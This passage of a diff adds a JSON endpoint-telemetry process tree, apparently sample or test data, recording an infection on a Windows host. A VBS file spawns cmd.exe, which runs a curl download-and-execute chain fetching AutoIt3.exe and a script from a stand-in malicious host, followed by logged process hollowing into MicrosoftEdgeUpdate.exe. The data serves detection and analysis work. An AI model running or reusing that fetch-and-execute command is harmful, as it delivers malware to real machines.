+                                        "details": "Process (ID:356813) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356812",
+                                        "details": "Process (ID:356812) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356811",
+                                        "details": "Process (ID:356811) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "chrome.exe",
+                                        "id": "356810",
+                                        "details": "Process (ID:356810) (since 2030-01-25 08:05:06.711000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility REDACTED<br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 08:05:08.207000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:49744 -> 34.34.34.34:443 (Protocol:TCP)<br/>",
+                                            "Context (at 2030-01-25 08:05:08.156000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: accounts.google.com<br/>Request type: 'HTTPS'<br/>",
+                                            "Context (at 2030-01-25 08:05:08.191000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: example1.com<br/>Request type: 'HTTPS'<br/>"
+                                        ],
+                                        "children": []
+                                    }
+                                ]
+                            },
+                            {
+                                "name": "AnyDesk.exe",
+                                "id": "99131072019",
+                                "details": "Process (ID:99131072019) (since 2030-01-25 08:05:12.448000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe\"  --control<br/>Executable path: C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe<br/>Hash (MD5): 17d3cc33a125d39097b58d5f653407d5<br/>Hash (SHA256): bb99d82c785b174928e89e5895121c562b14888d03ca61ff93c0050af87b07fc<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                "context": [
+                                    "Context (at 2030-01-25 09:11:16.565000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): bb99d82c785b174928e89e5895121c562b14888d03ca61ff93c0050af87b07fc<br/>"
+                                ],
+                                "children": [{
+                                    "name": "MicrosoftEdgeUpdate.exe",
+                                    "id": "794120",
+                                    "details": "Process (ID:794120) (since 2030-01-25 08:52:05.071000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe<br/>Hash (MD5): a4fc8ec5bc41c41918b0c1541e4e4be6<br/>Hash (SHA256): 54545f352215a9c0f370a01980aadcd5749a93589931662d89a974d7bd60f476<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                    "context": [
+                                        "Context (at 2030-01-25 08:52:05.125000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 54545f352215a9c0f370a01980aadcd5749a93589931662d89a974d7bd60f476<br/>"
+                                    ],
+                                    "children": []
+                                }]
+                            },
+                            {
+                                "name": "wscript.exe",
+                                "id": "99658243236",
+                                "details": "Process (ID:99658243236) (since 2030-01-25 08:51:56.588000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\victim\\Downloads\\i\\Report-86.vbs\" <br/>Executable path: C:\\Windows\\System32\\wscript.exe<br/>Hash (MD5): cd3c1773cef2611325fa884926090538<br/>Hash (SHA256): 7478b567c9ec9a1e1061f9c6db2993fcdc2ec4e8fb5ca6da80fa307b54116e69<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                "context": [
+                                    "Context (at 2030-01-25 08:51:57.376000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 7478b567c9ec9a1e1061f9c6db2993fcdc2ec4e8fb5ca6da80fa307b54116e69<br/>"
+                                ],
+                                "children": [{
+                                    "name": "cmd.exe",
+                                    "id": "99658851716",
+                                    "details": "Process (ID:99658851716) (since 2030-01-25 08:51:57.084000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Windows\\System32\\cmd.exe\" /c cd /d %temp% & curl -o Autoit3.exe http://malicious.tld:2351 & curl -o abcdef.au3 http://malicious.tld:2351/msirzgnzamg & Autoit3.exe abcdef.au3\r<br/>Executable path: C:\\Windows\\System32\\cmd.exe<br/>Hash (MD5): 5a6be4d2519515241d0c133a26cf62c0<br/>Hash (SHA256): 423e0e810a69aaceba0e5670e58aff898cf0ebffab99ccb46ebb3464c3d2facb<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                    "context": [
+                                        "Context (at 2030-01-25 08:52:05.158000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 423e0e810a69aaceba0e5670e58aff898cf0ebffab99ccb46ebb3464c3d2facb<br/>"
+                                    ],
+                                    "children": [{
+                                            "name": "Autoit3.exe",
+                                            "id": "58431",
+                                            "details": "Process (ID:58431) (since 2030-01-25 08:52:03.293000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: Autoit3.exe  abcdef.au3<br/>Executable path: C:\\Users\\victim\\AppData\\Local\\Temp\\Autoit3.exe<br/>Hash (MD5): c56b5f0201a3b3de53e561fe76912bfd<br/>Hash (SHA256): 237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                            "context": [
+                                                "Context (at 2030-01-25 08:52:05.133000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d<br/>",
+                                                "Context (at 2030-01-25 08:52:03.646000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: malicious.tld<br/>Request type: 'AAAA'<br/>Resolved IPv4 addresses: 162.33.179.65;<br/>Query status: OK<br/>",
+                                                "Context (at 0)   <span style=\"color:#fd8d3c\">ProcessInjection</span>:<br/>Target process ID: 794120, Target thread ID: 2585978, Thread execution control type: 'process hollowing', Well known target function: 'Unknown'<br/>Source image path: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\Autoit3.exe<br/>Target image path: C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe<br/>",
+                                                "Context (at 2030-01-25 08:52:04.987000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\ProgramData\\\\hehehehe<br/>",
+                                                "Context (at 2030-01-25 08:52:04.987000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\hohohoho<br/>",
+                                                "Context (at 2030-01-25 08:52:04.987000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\ProgramData\\\\eeheage\\\\hhddhff<br/>",
+                                                "Context (at 0)   <span style=\"color:#fd8d3c\">ProcessInjection</span>:<br/>Target process ID: 794120, Target thread ID: 2585978, Thread execution control type: 'process hollowing', Well known target function: 'Unknown'<br/>Source image path: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\Autoit3.exe<br/>Target image path: C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe<br/>",
+                                                "Context (at 2030-01-25 08:52:04.954000)   <span style=\"color:#fd8d3c\">NewScriptWritten</span>:<br/>File name: C:\\\\temp\\\\abcdef.au3<br/>Status: 'Success'<br/>",
+                                                "Context (at 2030-01-25 08:52:04.972000)   <span style=\"color:#fd8d3c\">NewExecutableWritten</span>:<br/>File name: C:\\\\temp\\\\AutoIt3.exe<br/>Status: 'Success'<br/>",
+                                                "Context (at 2030-01-25 08:52:03.454000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\temp<br/>",
+                                                "Context (at 2030-01-25 08:52:03.651000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.92.0.14:51470 -> 162.33.179.65:2351 (Protocol:TCP)<br/>"
+                                            ],
+                                            "children": []
+                                        },
+                                        {
+                                            "name": "curl.exe",
+                                            "id": "67244",
+                                            "details": "Process (ID:67244) (since 2030-01-25 08:52:02.256000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: curl  -o abcdef.au3 http://malicious.tld:2351/msirzgnzamg <br/>Executable path: C:\\Windows\\System32\\curl.exe<br/>Hash (MD5): 05dedf1936a065612e52c37e40143646<br/>Hash (SHA256): 664bb48bf3e8a7d7036e4b0029fa10e1a90c2562ad9a09a885650408d00dea1b<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                            "context": [
+                                                "Context (at 2030-01-25 08:52:03.072000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 664bb48bf3e8a7d7036e4b0029fa10e1a90c2562ad9a09a885650408d00dea1b<br/>",
+                                                "Context (at 2030-01-25 08:52:02.305000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: malicious.tld<br/>Request type: 'AAAA'<br/>Resolved IPv4 addresses: 162.33.179.65;<br/>Query status: OK<br/>",
+                                                "Context (at 2030-01-25 08:52:02.580000)   <span style=\"color:#fd8d3c\">NewScriptWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\abcdef.au3<br/>Status: 'Success'<br/>",
+                                                "Context (at 2030-01-25 08:52:02.311000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.92.0.14:51469 -> 162.33.179.65:2351 (Protocol:TCP)<br/>"
+                                            ],
+                                            "children": []
+                                        },
+                                        {
+                                            "name": "curl.exe",
+                                            "id": "981295",
+                                            "details": "Process (ID:981295) (since 2030-01-25 08:51:57.468000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: curl  -o Autoit3.exe http://malicious.tld:2351 <br/>Executable path: C:\\Windows\\System32\\curl.exe<br/>Hash (MD5): 05dedf1936a065612e52c37e40143646<br/>Hash (SHA256): 664bb48bf3e8a7d7036e4b0029fa10e1a90c2562ad9a09a885650408d00dea1b<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                            "context": [
+                                                "Context (at 2030-01-25 08:52:02.245000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 664bb48bf3e8a7d7036e4b0029fa10e1a90c2562ad9a09a885650408d00dea1b<br/>",
+                                                "Context (at 2030-01-25 08:51:58.342000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: malicious.tld<br/>Request type: 'AAAA'<br/>Resolved IPv4 addresses: 162.33.179.65;<br/>Query status: OK<br/>",
+                                                "Context (at 2030-01-25 08:51:58.782000)   <span style=\"color:#fd8d3c\">NewExecutableWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\Autoit3.exe<br/>Status: 'Success'<br/>",
+                                                "Context (at 2030-01-25 08:51:58.348000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.92.0.14:51466 -> 162.33.179.65:2351 (Protocol:TCP)<br/>"
+                                            ],
+                                            "children": []
+                                        },
+                                        {
+                                            "name": "conhost.exe",
+                                            "id": "332384",
+                                            "details": "Process (ID:332384) (since 2030-01-25 08:51:57.386000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1<br/>Executable path: C:\\Windows\\System32\\conhost.exe<br/>Hash (MD5): 6cde0df29440369a44915482d2512e94<br/>Hash (SHA256): c59205c19edc4b83db79df597b94e36f11b8c2820625041889be0445a52c7ba7<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                            "context": [
+                                                "Context (at 2030-01-25 08:52:05.176000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): c59205c19edc4b83db79df597b94e36f11b8c2820625041889be0445a52c7ba7<br/>"
+                                            ],
+                                            "children": []
+                                        }
+                                    ]
+                                }]
+                            },
+                            {
+                                "name": "Notepad.exe",
+                                "id": "979234",
+                                "details": "Process (ID:979234) (since 2030-01-25 08:51:48.965000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2307.27.0_x64__8wekyb3d8bbwe\\Notepad\\Notepad.exe\" \"C:\\Users\\victim\\Downloads\\i\\Report-86.txt\"<br/>Executable path: C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2307.27.0_x64__8wekyb3d8bbwe\\Notepad\\Notepad.exe<br/>Hash (MD5): 23b071c0f33d0cf8d1fa283398b14479<br/>Hash (SHA256): 1db240f9a41d5798f58df1bfe61fdd8385e88d6c321367bc5dba8c14ee8f375f<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Impersonation Token'<br/>",
+                                "context": [
+                                    "Context (at 2030-01-25 08:51:52.050000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 1db240f9a41d5798f58df1bfe61fdd8385e88d6c321367bc5dba8c14ee8f375f<br/>"
+                                ],
+                                "children": []
+                            },
+                            {
+                                "name": "Notepad.exe",
+                                "id": "530350",
+                                "details": "Process (ID:530350) (since 2030-01-25 08:47:43.433000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2307.27.0_x64__8wekyb3d8bbwe\\Notepad\\Notepad.exe\" \"C:\\Users\\victim\\AppData\\Local\\Temp\\Temp099495a1-7086-4652-8a99-bb5780070b08_i.zip\\Report-86.txt\"<br/>Executable path: C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2307.27.0_x64__8wekyb3d8bbwe\\Notepad\\Notepad.exe<br/>Hash (MD5): 23b071c0f33d0cf8d1fa283398b14479<br/>Hash (SHA256): 1db240f9a41d5798f58df1bfe61fdd8385e88d6c321367bc5dba8c14ee8f375f<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Impersonation Token'<br/>",
+                                "context": [
+                                    "Context (at 2030-01-25 08:47:47.678000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 1db240f9a41d5798f58df1bfe61fdd8385e88d6c321367bc5dba8c14ee8f375f<br/>"
+                                ],
+                                "children": []
+                            },
+                            {
+                                "name": "runonce.exe",
+                                "id": "206897",
+                                "details": "Process (ID:206897) (since 2030-01-25 08:05:12.387000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: C:\\Windows\\SysWOW64\\runonce.exe /Run6432<br/>Executable path: C:\\Windows\\SysWOW64\\runonce.exe<br/>Hash (MD5): 7dcbb80a4da437b1ebb6111537c66897<br/>Hash (SHA256): 331adb7e421d5c81f60c584398afc5fb19b84272631b763cf6f773cda62acfd4<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                "context": [
+                                    "Context (at 2030-01-25 08:05:17.208000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 331adb7e421d5c81f60c584398afc5fb19b84272631b763cf6f773cda62acfd4<br/>"
+                                ],
+                                "children": [{
+                                    "name": "Teams.exe",
+                                    "id": "161547",
+                                    "details": "Process (ID:161547) (since 2030-01-25 08:05:12.589000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Teams Installer\\Teams.exe\" --checkInstall --source=PROPLUS<br/>Executable path: C:\\Program Files (x86)\\Teams Installer\\Teams.exe<br/>Hash (MD5): 9e1ba14b9fcc43713e88dcb9894842a8<br/>Hash (SHA256): d71aece8257fc268b36610c3dba8311afa564e576140ad80dd2518a7bfb4252d<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                    "context": [
+                                        "Context (at 2030-01-25 08:05:13.486000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): d71aece8257fc268b36610c3dba8311afa564e576140ad80dd2518a7bfb4252d<br/>"
+                                    ],
+                                    "children": []
+                                }]
+                            }
+                        ]
+                    }]
+                }
+            ]
+        }]
+    }]
+}
